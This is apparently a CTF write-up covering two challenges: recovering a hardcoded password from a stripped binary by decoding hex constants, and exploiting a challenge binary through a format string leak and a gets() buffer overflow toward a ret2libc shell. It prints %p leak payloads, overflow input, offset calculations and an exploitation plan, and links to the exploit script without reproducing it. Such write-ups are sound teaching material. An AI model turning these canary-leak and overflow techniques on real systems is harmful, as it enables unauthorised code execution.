### BIC 2023 WINTER CTF 

### Description: This is a CTF hosted by Blacks In Cybersecurity

##### It was a fun challenge which I focused only on solving all pwn challenges but sadly they only brought one pwn challenge. I was able to solve the pwn challenge with an easy reverse engineering chall. Lets get straight to it

#### Reverse Engineering 

Firstly i'll do the easy reverse engineering challenge 

Basic file checks

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/rev]
└─$ file chall       
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=32b061e72f3608b65f0649e1f97e7d5d5b049b87, for GNU/Linux 3.2.0, stripped
```

From the file check we know that its a x64 binary and its statically linked (meaning that all libraries that the executable needs are integrated inside) and also is stripped ( meaning that we won't be able to see the function names)

Lets run it to know what it does

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/rev]
└─$ ./chall       
/===========================================================================\
|               Welcome to BIC Winter CTF \0/                               |
+===========================================================================+
[ERROR] Login information missing
Usage: ./chall <username> <password>
```

It requires passing two parameters which are username and password

Since i don't know it lets decompile the binary using ghidra

After decompiling it i'll click on the entry function
![image](https://user-images.githubusercontent.com/113513376/221995246-1f50e94a-4f9d-4687-b9c7-6b8176d1ccb8.png)

Then i'll click on `FUN_004018c5` which is going to be the main function
![image](https://user-images.githubusercontent.com/113513376/221995630-55f448e4-f7ed-4712-8952-e5f497ce7325.png)

We can see the decompiled code 

Well thats some confusion goin on here 😹. Anyways looking at the code we see that some hex values are stored in two variable then it checks if argv[1] that means the argument one i.e the username is equal to password 

Lets confirm it bypassing in `hacker` as argv[1] with a random pass as argv[2]

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/rev]
└─$ ./chall hacker lol             
/===========================================================================\
|               Welcome to BIC Winter CTF \0/                               |
+===========================================================================+
 ~> Verifying.......ACCESS DENIED
 ~> Incorrect password
```

We get incorrect password. I will decode the value stored in variable local_b8 and local_b0 respectively using xxd

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/rev]
└─$ echo 0x495f6730545f6d34 | xxd -r -p                        
I_g0T_m4                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/rev]
└─$ echo 0x645f736b316c4c7a | xxd -r -p      
d_sk1lLz
```

We get its ascii value now lets join it together and passing as the second parameter which is the password

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/rev]
└─$ python3
Python 3.11.1 (main, Dec 31 2022, 10:23:59) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a = 'I_g0T_m4'
>>> b = 'd_sk1lLz'
>>> "".join(a+b)
'I_g0T_m4d_sk1lLz'
>>>

┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/rev]
└─$ ./chall hacker I_g0T_m4d_sk1lLz
/===========================================================================\
|               Welcome to BIC Winter CTF \0/                               |
+===========================================================================+
 ~> Verifying.......Correct!
Welcome back!
bicWC{I_g0T_m4d_sk1lLz}
```

And thats all for it the flag is `bicWC{I_g0T_m4d_sk1lLz}`


### Binary Exploitation

We're given a binary and the remote libc file

```
└─$ ll   
total 2200
-rw-r--r-- 1 mark mark 2216304 Feb 24 12:45 libc.so.6
-rwxr-xr-x 1 mark mark   16400 Feb 24 12:45 shifu
```

Lets start with basic file check

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ file shifu
shifu: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dbb299ef126aed58f3ff6868a8db65d0f84e00ee, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ checksec --format=json --file=shifu | jq       
{
  "shifu": {
    "relro": "partial",
    "canary": "yes",
    "nx": "yes",
    "pie": "yes",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "4"
  }
}
```


We're working with a x64 binary which is dynamically linked and not stripped 

And from its protection we see that all protection are enabled except relro which is partial

Before i run it, the binary will by default use my device libc library

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ ldd shifu
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc4000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)

```

Since we're given the libc library to use i'll use `patchelf` to patch the binary so it will use the libc given

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ patchelf --set-rpath "." shifu
                                                                                                     
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ ldd shifu
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => ./libc.so.6 (0x00007ffff7c00000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
                                                              
```

Cool we can now run it to know what it does

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ ./shifu     
What is Your BICCodeName?
Agent: pwnzzz
Welcome: pwnzzz
Here is a gift for you: 0x7ffa521fc450
Enter your agent!ls
Syncing identify with secret > ls 
Oops Imposter!!!
```

We see that it asks for our input then prints our input which after that prints out an address of the stack and asks for our input again

To understand whats going on i'll decompile the binary using ghidra

Since its not stripped i can view function names
![image](https://user-images.githubusercontent.com/113513376/221999164-c1610d9a-ee70-484c-9be6-8117e8a7a865.png)

Here's the main function
![image](https://user-images.githubusercontent.com/113513376/221999232-e30f6a8d-78ce-43b0-8039-29865f477864.png)

I'll rename some variables there for better understanding

```
undefined8 main(void)

{
  long in_FS_OFFSET;
  char input [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("What is Your BICCodeName?\nAgent: ");
  read(0,input,0x10);
  fwrite("Welcome: ",1,9,stdout);
  printf(input);
  fprintf(stdout,"Here is a gift for you: %p\n",printf);
  hide();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Ok now from the decompiled code we can tell whats goin on here

```
1. It asks for our input which reads 0x10 bytes and stores the value in the input buffer which can hold up to 24 bytes of data
2. It prints out our input # bug here
3. An address is leaked off the stack in this case its the printf address
4. The hide() function is called
```

Here's the decompiled hide() function
![image](https://user-images.githubusercontent.com/113513376/221999658-5fd1726d-02f4-404b-b93c-94f61c0bb9f3.png)

```
void hide(void)

{
  long in_FS_OFFSET;
  char input [136];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  fwrite("Enter your agent!",1,0x11,stdout);
  gets(input);
  fprintf(stdout,"Syncing identify with secret > %s \n",input);
  fwrite("Oops Imposter!!!\n",1,0x11,stdout);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Here's whats goin on 

```
1. It receives our input using gets() # bug here
2. It then prints out our input then exits
```

From this we know that there are 2 bugs in this program which are 

```
1. Format String Vulnerability
2. Buffer Overflow
```

The main function shows that it prints out our input without using a format specifier

```
printf(input);
```

And the hide function uses gets() to receive our input

```
gets(input);
```

The idea of not using a format specifier can lead to leaking of address off the stack while the usage of get will cause a buffer overflow 

But now we know that we can cause a buffer overflow thanks to get() being used we can overflow the buffer. There's one problem stack canary is being used so when we corrupt a particular memory of the binary it will trigger the stack canary

Here's what i mean 

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ python2 -c 'print "A"*200'                 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ ./shifu
What is Your BICCodeName?
Agent: pwnzz
Welcome: pwnzz
Here is a gift for you: 0x7ff27fcb0450
Enter your agent!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Syncing identify with secret > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Oops Imposter!!!
*** stack smashing detected ***: terminated
zsh: IOT instruction  ./shifu                           
```

We get `*** stack smashing detected ***: terminated` which is the cause from stack canary being used by the program 

How we can take advantage of this is through the usage of the format string vulnerability

Since it can be used to leak address off the stack we can potentially leak the canary address

But note that the stack canary address changes per runtime of the program

This is an example of leaking address off the stack

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ ./shifu 
What is Your BICCodeName?
Agent: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Welcome: 0x55cc7413007a.0x1.0x7f742cba2190.(nil).0x7f742ccaa6a0.Here is a gift for you: 0x7f742cafc450
Enter your agent!Syncing identify with secret > p.%p.%p.%p.%p.%p.%p.%p.%p.%p. 
Oops Imposter!!!
```

From that we've leaked address off the stack and how we can know that its the stack canary is because stack canary address ends with `00`

We can also specifier the offset address we want to leak by using `%n$p where n=integer value (where we want to leak)`

Lets try it out

```
└─$ ./shifu 
What is Your BICCodeName?
Agent: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Welcome: 0x55cc7413007a.0x1.0x7f742cba2190.(nil).0x7f742ccaa6a0.Here is a gift for you: 0x7f742cafc450
Enter your agent!Syncing identify with secret > p.%p.%p.%p.%p.%p.%p.%p.%p.%p. 
Oops Imposter!!!
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ ./shifu
What is Your BICCodeName?
Agent: %1$p
Welcome: 0x55add749607a
Here is a gift for you: 0x7f79894bd450
Enter your agent!
Syncing identify with secret >  
Oops Imposter!!!
                                                                                                                                                                                                                   
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ ./shifu
What is Your BICCodeName?
Agent: %10$p
Welcome: (nil)
Here is a gift for you: 0x7f0b369bb450
Enter your agent!
Syncing identify with secret >  
Oops Imposter!!!
```

We see that the first offset `%1$p` corresponds with what we leaked initially which is `0x55cc7413007a` and the tenth offset doesn't have any adderss thats why it shows `(nil)`

From this we can do this manually but its not going to be efficient cause its time wasting so instead i'll use a script

But before i do that here's another thing that will cause issue for us

The binary has PIE enabled which basically will randomize address making it not possible to call an address 

But with this format string vulnerability we can leak an address and calculate its offset to the main address

I'll use gdb-pwngdb for it 

Lets load up the binary 

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ gdb-pwndbg shifu 
Reading symbols from shifu...
(No debugging symbols found in shifu)
pwndbg: loaded 138 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
Use the errno (or errno <number>) command to see the name of the last or provided (libc) error
pwndbg> break main
Breakpoint 1 at 0x1280
pwndbg> r
Starting program: /home/mark/Desktop/CTF/WinterCon/pwn/shifu 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555555280 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
*RAX  0x55555555527c (main) ◂— push rbp
*RBX  0x7fffffffdfe8 —▸ 0x7fffffffe332 ◂— '/home/mark/Desktop/CTF/WinterCon/pwn/shifu'
*RCX  0x555555557de8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555140 (__do_global_dtors_aux) ◂— endbr64 
*RDX  0x7fffffffdff8 —▸ 0x7fffffffe35d ◂— 0x5245545f5353454c ('LESS_TER')
*RDI  0x1
*RSI  0x7fffffffdfe8 —▸ 0x7fffffffe332 ◂— '/home/mark/Desktop/CTF/WinterCon/pwn/shifu'
 R8   0x0
*R9   0x7ffff7fcf6a0 (_dl_fini) ◂— push rbp
*R10  0x7ffff7fcb878 ◂— 0xc00120000000e
*R11  0x7ffff7fe18c0 (_dl_audit_preinit) ◂— mov eax, dword ptr [rip + 0x1b552]
 R12  0x0
*R13  0x7fffffffdff8 —▸ 0x7fffffffe35d ◂— 0x5245545f5353454c ('LESS_TER')
*R14  0x555555557de8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555140 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
*RBP  0x7fffffffded0 ◂— 0x1
*RSP  0x7fffffffded0 ◂— 0x1
*RIP  0x555555555280 (main+4) ◂— sub rsp, 0x30
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
 ► 0x555555555280 <main+4>     sub    rsp, 0x30
   0x555555555284 <main+8>     mov    dword ptr [rbp - 0x24], edi
   0x555555555287 <main+11>    mov    qword ptr [rbp - 0x30], rsi
   0x55555555528b <main+15>    mov    rax, qword ptr fs:[0x28]
   0x555555555294 <main+24>    mov    qword ptr [rbp - 8], rax
   0x555555555298 <main+28>    xor    eax, eax
   0x55555555529a <main+30>    lea    rax, [rip + 0xdb7]
   0x5555555552a1 <main+37>    mov    rdi, rax
   0x5555555552a4 <main+40>    mov    eax, 0
   0x5555555552a9 <main+45>    call   printf@plt                <printf@plt>
 
   0x5555555552ae <main+50>    lea    rax, [rbp - 0x20]
─────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffded0 ◂— 0x1
01:0008│         0x7fffffffded8 —▸ 0x7ffff7df018a (__libc_start_call_main+122) ◂— mov edi, eax
02:0010│         0x7fffffffdee0 —▸ 0x7fffffffdfd0 —▸ 0x7fffffffdfd8 ◂— 0x38 /* '8' */
03:0018│         0x7fffffffdee8 —▸ 0x55555555527c (main) ◂— push rbp
04:0020│         0x7fffffffdef0 ◂— 0x100000000
05:0028│         0x7fffffffdef8 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe332 ◂— '/home/mark/Desktop/CTF/WinterCon/pwn/shifu'
06:0030│         0x7fffffffdf00 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe332 ◂— '/home/mark/Desktop/CTF/WinterCon/pwn/shifu'
07:0038│         0x7fffffffdf08 ◂— 0x63b49fdf1371ab8e
───────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0   0x555555555280 main+4
   f 1   0x7ffff7df018a __libc_start_call_main+122
   f 2   0x7ffff7df0245 __libc_start_main+133
   f 3   0x5555555550c1 _start+33
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> piebase
Calculated VA from /home/mark/Desktop/CTF/WinterCon/pwn/shifu = 0x555555554000
pwndbg> 
```

Now i'll pick the main function address from ghidra `0010127c`
![image](https://user-images.githubusercontent.com/113513376/222003030-68258ddc-973c-4d75-8e9b-b50d45688d55.png)

Then i will set a breakpoint at `127c` back on gdb-pwngdb

```
pwndbg> piebase
Calculated VA from /home/mark/Desktop/CTF/WinterCon/pwn/shifu = 0x555555554000       
pwndbg> breakrva 0x127c
Breakpoint 2 at 0x55555555527c
pwndbg> x 0x55555555527c - 0x555555554000
0x127c: Cannot access memory at address 0x127c
pwndbg> 
```

Another thing i'll do is to turn off aslr `Address space layout randomization` because it also randomize address

```
┌──(mark㉿haxor)-[~/Desktop/CTF/WinterCon/pwn]
└─$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
```

With this ready i need to get an address off the stack that each run time its address or the last three address bytes won't change and this will be done by leveraging the format string vuln 

Here's the script i used to fuzz both the addr and canary [FUZZ](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bic23/fuzz.py)

Running it leaks off address for me 
![image](https://user-images.githubusercontent.com/113513376/222005170-7910bcce-2fd1-4277-b5fc-8c9eef2bbacb.png)

If you notice the 11th address we see its the canary and also the 13th address didn't really change

I can confirm whats the value of the 13th address using gdb-pwngdb
![image](https://user-images.githubusercontent.com/113513376/222005532-f782f5d8-466a-41a9-899c-283cd5ad2fe0.png)

So thats the call to the main function

Since thats ready here's the next thing we want to do

We know that the hide() function is vulnerable to buffer overflow we can take control over the binary 

A leak is also given to us which is the printf address 

The best rop to perform here is return to libc `ret2libc`

The idea is this:

```
1. Leak the stack and pie address off the stack
2. Overwrite the value of canary and replace with the leaked canary
3. Calculate the libc base address
4. Call sh on system i.e system(/bin/sh)
```

We need to first take advantage of gets() to overflow the canary variable

Here's the stack layout
![image](https://user-images.githubusercontent.com/113513376/222007546-ce9ac178-206f-41ab-bbd9-39d57fdb010e.png)

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined hide()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 canary                                  XREF[2]:     001011e0(W), 
                                                                                                   00101266(R)  
             undefined1[136]   Stack[-0x98]   input                                   XREF[2]:     00101209(*), 
                                                                                                   00101224(*)  
                             hide                                            XREF[4]:     Entry Point(*), main:0010131d(c), 
                                                                                          001020cc, 00102190(*)  
        001011cc 55              PUSH       RBP

```

Looking at it the canary starts at offset `0x10` and our input starts at offset `0x98` doing the math ` 0x98 - 0x10 = 0x88` we get the offset as `0x88` which is `136` in decimal

So after we overflow the canary value i'll then replace it back to its initial value which is the one we leaked then pad it with 8 bytes since this is a x64 binary

Here's my exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bic23/autopwn.py)

Running it gives us shell
![image](https://user-images.githubusercontent.com/113513376/222008438-bf3ef38f-00f8-4985-bd11-0c134cdc6a2b.png)

The remote server is down so i can't run it as of now too bad 😞

Anyways i'm done xD

Till next time 👻

<br> <br>
[Back To Home](../../../../index.md)


